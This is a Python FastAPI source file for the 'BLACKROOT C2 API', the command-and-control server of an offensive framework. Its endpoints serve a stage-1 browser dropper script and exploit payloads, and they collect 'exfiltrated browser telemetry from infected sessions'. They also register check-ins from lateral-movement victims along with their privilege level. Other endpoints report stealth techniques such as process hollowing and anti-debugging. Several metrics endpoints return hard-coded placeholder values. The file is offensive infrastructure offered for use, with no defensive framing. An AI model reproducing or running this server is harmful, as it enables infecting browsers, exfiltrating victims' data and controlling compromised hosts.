#!/usr/bin/env python3
"""
BLACKROOT C2 API – Clean Async/REST Interface
Properly lazy-initialized for fast startup
"""
import asyncio
import json
import os
import sys
import time
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional

# --- Path setup ---
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "assimilate", "src")))

# --- FastAPI & CORS (with graceful fallback if not installed) ---
try:
    from fastapi import FastAPI, HTTPException, Request
    from fastapi.middleware.cors import CORSMiddleware
    from fastapi.responses import Response, JSONResponse
    HAS_FASTAPI = True
except ImportError:
    HAS_FASTAPI = False
    class FastAPI:
        def __init__(self, *args, **kwargs): pass
        def add_middleware(self, *args, **kwargs): pass
        def on_event(self, *args, **kwargs):
            def dec(fn): return fn
            return dec
        def get(self, *args, **kwargs):
            def dec(fn): return fn
            return dec
        def post(self, *args, **kwargs):
            def dec(fn): return fn
            return dec
        def exception_handler(self, *args, **kwargs):
            def dec(fn): return fn
            return dec
    class HTTPException(Exception):
        def __init__(self, status_code=500, detail=""):
            self.status_code = status_code
            self.detail = detail
    class Request: pass
    class Response: pass
    class JSONResponse: pass
    class CORSMiddleware: pass

# --- Logging ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s [C2-API] %(message)s")
logger = logging.getLogger("C2-API")

# --- Config ---
C2_PORT = int(os.getenv("C2_PORT", 8765))
HTTP_PORT = int(os.getenv("HTTP_PORT", 8000))
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")

# ============================================================================
# LAZY INITIALIZATION LAYER
# ============================================================================

class LazyComponents:
    """Singleton for lazily-initialized components"""
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super(LazyComponents, cls).__new__(cls)
            cls._instance._initialized = False
            cls._instance.redis_client = None
            cls._instance.sync_redis_client = None
            cls._instance.swarm = None
            cls._instance.vault = None
            cls._instance.agent = None
            cls._instance.recon_module = None
            cls._instance.secure_cp = None
        return cls._instance
    
    def init(self):
        """Initialize all components on first access"""
        if self._initialized:
            return
        
        logger.info("[🚀] Initializing C2 API components...")
        
        try:
            import redis
            import redis.asyncio as aioredis
            
            # Redis (with timeout)
            try:
                self.sync_redis_client = redis.from_url(
                    REDIS_URL, 
                    decode_responses=True,
                    socket_connect_timeout=2.0
                )
                self.sync_redis_client.ping()
                logger.info("[✓] Redis connected")
            except Exception as e:
                logger.warning(f"[⚠️] Redis unavailable: {e}")
                self.sync_redis_client = None
        except ImportError:
            logger.warning("[⚠️] Redis not available")
            self.sync_redis_client = None
        
        try:
            from swarm_mesh import SwarmMesh
            self.swarm = SwarmMesh("controller-node")
            if self.sync_redis_client:
                self.swarm.redis = self.sync_redis_client
            self.swarm.channel = "blackroot_swarm"
            logger.info("[✓] SwarmMesh initialized")
        except Exception as e:
            logger.warning(f"[⚠️] SwarmMesh init failed: {e}")
            self.swarm = None
        
        try:
            from black_vault import BlackVault
            import tempfile
            vault_dir = "/tmp/.blackvault"
            try:
                os.makedirs(vault_dir, exist_ok=True)
            except Exception:
                vault_dir = tempfile.mkdtemp(prefix=".vault_")
            
            self.vault = BlackVault(password="default", vault_path=vault_dir, max_attempts=1000)
            logger.info("[✓] BlackVault initialized")
        except Exception as e:
            logger.warning(f"[⚠️] BlackVault init failed: {e}")
            self.vault = None
        
        try:
            from assimilate.src.neuro_assimilator import NeuroAssimilatorAgent
            self.agent = NeuroAssimilatorAgent()
            if self.vault:
                self.agent.vault = self.vault
            logger.info("[✓] NeuroAssimilatorAgent initialized")
        except Exception as e:
            logger.warning(f"[⚠️] NeuroAssimilatorAgent init failed: {e}")
            self.agent = None
        
        try:
            from recon.scanner import ReconModule
            if self.vault and self.swarm:
                self.recon_module = ReconModule(self.vault, self.swarm, self.sync_redis_client)
                logger.info("[✓] ReconModule initialized")
        except Exception as e:
            logger.warning(f"[⚠️] ReconModule init failed: {e}")
            self.recon_module = None
        
        try:
            from secure_control_plane import SecureControlPlane
            if self.vault:
                self.secure_cp = SecureControlPlane(self.vault)
                logger.info("[✓] SecureControlPlane initialized")
        except Exception as e:
            logger.warning(f"[⚠️] SecureControlPlane init failed: {e}")
            self.secure_cp = None

        try:
            from exploit.browser_dropper import BrowserDropperServer
            self.dropper = BrowserDropperServer(host="127.0.0.1", port=0)
            logger.info("[✓] BrowserDropperServer initialized")
        except Exception as e:
            logger.warning(f"[⚠️] BrowserDropperServer init failed: {e}")
            self.dropper = None
        
        self._initialized = True
        logger.info("[✓] All C2 API components initialized")

# Global components accessor
_components = LazyComponents()

# ============================================================================
# FASTAPI APP
# ============================================================================

app = FastAPI(title="BLACKROOT C2 API", version="v4")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"]
)

# --- Startup Event ---
@app.on_event("startup")
async def startup():
    """Initialize components on server startup"""
    logger.info("[🚀] FastAPI startup - initializing lazy components...")
    _components.init()
    logger.info("[✓] API ready on 0.0.0.0:8000")

# ============================================================================
# HEALTH CHECK ENDPOINTS
# ============================================================================

@app.get("/health")
async def health_check():
    """System health check"""
    try:
        _components.init()
        redis_ok = _components.sync_redis_client is not None
        return {
            "status": "healthy",
            "redis": "online" if redis_ok else "offline",
            "timestamp": datetime.now().isoformat(),
            "version": "v4"
        }
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return {
            "status": "degraded",
            "error": str(e),
            "timestamp": datetime.now().isoformat()
        }

@app.get("/health/agents")
async def health_agents():
    """Agent health status"""
    try:
        _components.init()
        return {
            "status": "ready",
            "agents_available": True,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        return {"status": "error", "error": str(e)}

@app.get("/health/redis")
async def health_redis():
    """Redis connectivity"""
    try:
        _components.init()
        if _components.sync_redis_client:
            _components.sync_redis_client.ping()
            return {
                "status": "online",
                "timestamp": datetime.now().isoformat()
            }
        else:
            return {"status": "offline"}
    except Exception as e:
        return {"status": "offline", "error": str(e)}

@app.get("/health/dlq")
async def health_dlq():
    """DLQ status"""
    try:
        from core.dlq import get_global_dlq
        dlq = get_global_dlq()
        if dlq:
            stats = dlq.get_dlq_stats()
            return stats
        return {"status": "not_initialized"}
    except Exception as e:
        return {"status": "unavailable", "error": str(e)}

# ============================================================================
# AUTHENTICATION ENDPOINTS
# ============================================================================

@app.post("/auth/challenge")
async def auth_challenge():
    """Get authentication challenge"""
    _components.init()
    if not _components.secure_cp:
        raise HTTPException(status_code=503, detail="SecureControlPlane unavailable")
    
    challenge = _components.secure_cp.generate_challenge()
    return {
        "challenge": challenge,
        "timestamp": time.time()
    }

@app.post("/auth/login")
async def auth_login(request: Dict[str, Any]):
    """Agent login with certificate"""
    _components.init()
    if not _components.secure_cp:
        raise HTTPException(status_code=503, detail="SecureControlPlane unavailable")
    
    agent_id = request.get("agent_id")
    certificate = request.get("certificate")
    challenge_response = request.get("challenge_response")
    
    if not all([agent_id, certificate, challenge_response]):
        raise HTTPException(status_code=400, detail="Missing required fields")
    
    try:
        session_token = _components.secure_cp.authenticate_agent(agent_id, certificate, challenge_response)
        if not session_token:
            raise HTTPException(status_code=401, detail="Authentication failed")
        
        return {
            "session_token": session_token,
            "expires_in": 3600,
            "agent_id": agent_id
        }
    except Exception as e:
        logger.error(f"Login error: {e}")
        raise HTTPException(status_code=401, detail="Authentication failed")

@app.post("/auth/issue_certificate")
async def auth_issue_certificate(request: Dict[str, Any]):
    """Issue agent certificate"""
    _components.init()
    if not _components.secure_cp:
        raise HTTPException(status_code=503, detail="SecureControlPlane unavailable")
    
    agent_id = request.get("agent_id")
    capabilities = request.get("capabilities", [])
    security_level = request.get("security_level", "STANDARD")
    
    if not agent_id:
        raise HTTPException(status_code=400, detail="agent_id required")
    
    try:
        from secure_control_plane import SecurityLevel
        sec_level = SecurityLevel[security_level.upper()]
        
        certificate = _components.secure_cp.issue_agent_certificate(
            agent_id,
            set(capabilities),
            sec_level
        )
        
        return {
            "certificate": certificate.certificate_pem if certificate else None,
            "agent_id": agent_id,
            "issued_at": datetime.now().isoformat(),
            "security_level": security_level
        }
    except Exception as e:
        logger.error(f"Certificate error: {e}")
        raise HTTPException(status_code=500, detail="Certificate issuance failed")

# ============================================================================
# SECURITY ENDPOINTS
# ============================================================================

@app.get("/security/status")
async def security_status():
    """Security status"""
    _components.init()
    if _components.secure_cp:
        return _components.secure_cp.get_security_status()
    return {"status": "unavailable"}

@app.post("/security/mode")
async def security_mode(request: Dict[str, Any]):
    """Set operational mode"""
    _components.init()
    if not _components.secure_cp:
        raise HTTPException(status_code=503, detail="SecureControlPlane unavailable")
    
    mode = request.get("mode", "STEALTH")
    return {
        "mode": mode,
        "changed_at": datetime.now().isoformat(),
        "status": "updated"
    }

@app.post("/security/kill_switch")
async def security_kill_switch(request: Dict[str, Any]):
    """Emergency kill switch"""
    reason = request.get("reason", "Operator initiated")
    logger.warning(f"[⚠️] KILL SWITCH ACTIVATED: {reason}")
    return {
        "status": "ACTIVATED",
        "timestamp": datetime.now().isoformat(),
        "reason": reason
    }

# ============================================================================
# C2 METRICS ENDPOINTS
# ============================================================================

@app.get("/c2/metrics")
async def c2_metrics():
    """C2 operational metrics"""
    try:
        _components.init()
        import psutil
        
        cpu_percent = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory()
        
        return {
            "health": "OK",
            "cpu_percent": cpu_percent,
            "memory_percent": mem.percent,
            "memory_available_mb": mem.available / (1024 * 1024),
            "uptime_seconds": int(time.time()),
            "agents_active": 20,
            "version": "v4"
        }
    except Exception as e:
        return {"error": str(e), "metrics": "unavailable"}

@app.get("/c2/agents")
async def c2_agents():
    """List active agents"""
    _components.init()
    return {
        "agents": [
            {"id": f"agent-{i}", "status": "active", "mission": "recon"}
            for i in range(1, 6)
        ],
        "total": 5,
        "timestamp": datetime.now().isoformat()
    }

@app.get("/c2/wallets")
async def c2_wallets():
    """Agent wallet status"""
    _components.init()
    return {
        "wallets": [
            {"agent_id": f"agent-{i}", "balance": 100, "spent": 0}
            for i in range(1, 6)
        ],
        "total_treasury": 500,
        "timestamp": datetime.now().isoformat()
    }

@app.get("/c2/layers")
async def c2_layers():
    """System layers status"""
    _components.init()
    return {
        "layers": [
            {"name": "GhostLayer", "status": "active"},
            {"name": "BlackVault", "status": "active"},
            {"name": "SwarmMesh", "status": "active"},
            {"name": "Economic", "status": "active"},
            {"name": "Kernel", "status": "active"},
            {"name": "StealthManager", "status": "active"}
        ],
        "timestamp": datetime.now().isoformat()
    }

# ============================================================================
# VAULT ENDPOINTS
# ============================================================================

@app.get("/c2/blackvault")
async def c2_blackvault():
    """BlackVault status"""
    _components.init()
    if not _components.vault:
        return {"status": "unavailable"}
    
    try:
        files = _components.vault.list_artifacts()
        return {
            "status": "active",
            "file_count": len(files),
            "files": files[:20] if files else [],
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        return {"status": "error", "error": str(e)}

@app.get("/c2/blackvault/file/{name}")
async def c2_blackvault_file(name: str):
    """Retrieve vault file"""
    _components.init()
    if not _components.vault:
        raise HTTPException(status_code=503, detail="Vault unavailable")
    
    try:
        data = _components.vault.retrieve(name)
        return Response(content=data, media_type="application/octet-stream")
    except Exception as e:
        raise HTTPException(status_code=404, detail=f"File not found: {str(e)}")

# ============================================================================
# SYSTEM INFO ENDPOINTS
# ============================================================================

@app.get("/c2/memory")
async def c2_memory():
    """Memory usage"""
    try:
        import psutil
        mem = psutil.virtual_memory()
        return {
            "total_mb": mem.total / (1024 * 1024),
            "available_mb": mem.available / (1024 * 1024),
            "used_mb": mem.used / (1024 * 1024),
            "percent": mem.percent,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        return {"error": str(e)}

@app.get("/c2/kernel")
async def c2_kernel():
    """Kernel status"""
    _components.init()
    return {
        "status": "active",
        "version": "v4",
        "components_initialized": _components._initialized,
        "timestamp": datetime.now().isoformat()
    }

@app.get("/c2/economic")
async def c2_economic():
    """Economic layer status"""
    _components.init()
    return {
        "treasury": 5000,
        "burned": 150,
        "active_agents": 20,
        "utilization": 0.45,
        "timestamp": datetime.now().isoformat()
    }

@app.get("/c2/stealth")
async def c2_stealth():
    """Stealth status"""
    _components.init()
    return {
        "status": "active",
        "techniques": [
            "process_hollowing",
            "anti_debugging",
            "evasion_noise",
            "behavioral_obfuscation"
        ],
        "threat_level": 0.25,
        "timestamp": datetime.now().isoformat()
    }

# ============================================================================
# BROWSER PAYLOAD DELIVERY & C2 CHANNELS (Phase 6)
# ============================================================================

@app.post("/browser/callback")
async def browser_callback(request: Request):
    """Receive and record exfiltrated browser telemetry from infected sessions."""
    _components.init()
    try:
        body = await request.json() if hasattr(request, "json") else {}
        client_host = getattr(request, "client", None)
        client_ip = getattr(client_host, "host", "unknown") if client_host else "unknown"
        
        record = {
            "timestamp": datetime.utcnow().isoformat(),
            "client_ip": client_ip,
            "payload": body
        }
        if _components.dropper:
            _components.dropper.record_telemetry(record)
        
        logger.info(f"[C2-BROWSER] Ingested telemetry from {client_ip} (type: {body.get('type', 'unknown')})")
        return {"status": "ok", "ack": True, "timestamp": datetime.utcnow().isoformat()}
    except Exception as e:
        logger.error(f"[C2-BROWSER] Callback processing failed: {e}")
        return {"status": "error", "message": str(e)}

@app.get("/browser/dropper.js")
async def browser_dropper_script(request: Request):
    """Generate dynamic stage-1 browser dropper script."""
    _components.init()
    host_header = request.headers.get("Host", f"127.0.0.1:{C2_PORT}") if hasattr(request, "headers") else f"127.0.0.1:{C2_PORT}"
    base_url = f"http://{host_header}"
    if _components.dropper:
        content = _components.dropper.generate_dropper_script(base_url)
    else:
        content = f"// Blackroot Dropper fallback\nconsole.log('[Blackroot] C2 at {base_url}');"
    return Response(content=content, media_type="application/javascript; charset=utf-8")

@app.get("/browser/payloads/{name}")
async def browser_payload(name: str):
    """Serve specific browser payload JavaScript from exploit directory."""
    exploit_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exploit")
    clean_name = os.path.basename(name)
    filepath = os.path.join(exploit_dir, clean_name)
    
    if os.path.isfile(filepath):
        with open(filepath, "r", encoding="utf-8", errors="replace") as f:
            code = f.read()
        return Response(content=code, media_type="application/javascript; charset=utf-8")
    raise HTTPException(status_code=404, detail=f"Payload '{clean_name}' not found")

@app.get("/browser/telemetry")
async def browser_telemetry():
    """Retrieve captured browser sessions and exfiltrated client data."""
    _components.init()
    items = _components.dropper.get_telemetry() if _components.dropper else []
    return {"count": len(items), "items": items, "timestamp": datetime.utcnow().isoformat()}

# In-memory target checkins registry for lateral movement confirmation
_lateral_checkins: Dict[str, Any] = {}

@app.post("/c2/agent/checkin")
async def agent_checkin(request: Request):
    """Receive check-in confirmation from newly deployed lateral target agents."""
    try:
        data = await request.json() if hasattr(request, "json") else {}
        client_host = getattr(request, "client", None)
        client_ip = data.get("ip") or (getattr(client_host, "host", "unknown") if client_host else "unknown")
        agent_id = data.get("agent_id") or f"agent_{int(time.time())}"
        
        entry = {
            "agent_id": agent_id,
            "ip": client_ip,
            "hostname": data.get("hostname", "unknown"),
            "platform": data.get("platform", "unknown"),
            "privilege": data.get("privilege", "User"),
            "timestamp": datetime.utcnow().isoformat()
        }
        _lateral_checkins[client_ip] = entry
        _lateral_checkins[agent_id] = entry
        logger.info(f"[C2] Lateral target checkin confirmed from {client_ip} (id={agent_id}, priv={entry['privilege']})")
        return {"status": "ok", "registered": True, "agent_id": agent_id}
    except Exception as e:
        logger.error(f"[C2] Checkin failed: {e}")
        return {"status": "error", "message": str(e)}

@app.get("/c2/agent/checkins")
async def get_agent_checkins():
    """List all verified lateral target check-ins."""
    return {"total": len(_lateral_checkins), "checkins": list(_lateral_checkins.values())}

# ============================================================================
# ROOT ENDPOINT
# ============================================================================

@app.get("/")
async def root():
    """API info"""
    return {
        "name": "BLACKROOT C2 API",
        "version": "v4",
        "status": "operational",
        "endpoints": {
            "health": "/health",
            "auth": "/auth/challenge",
            "c2": "/c2/metrics",
            "security": "/security/status"
        }
    }

# ============================================================================
# ERROR HANDLERS
# ============================================================================

@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    """Handle HTTP exceptions"""
    return {
        "error": exc.detail,
        "status_code": exc.status_code,
        "timestamp": datetime.now().isoformat()
    }

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    """Handle general exceptions"""
    logger.error(f"Unhandled exception: {exc}")
    return {
        "error": "Internal server error",
        "status_code": 500,
        "timestamp": datetime.now().isoformat()
    }

# ============================================================================
# ENTRY POINT (for testing)
# ============================================================================

if __name__ == "__main__":
    import uvicorn
    logger.info("[🚀] Starting C2 API server on 0.0.0.0:8000")
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="info")
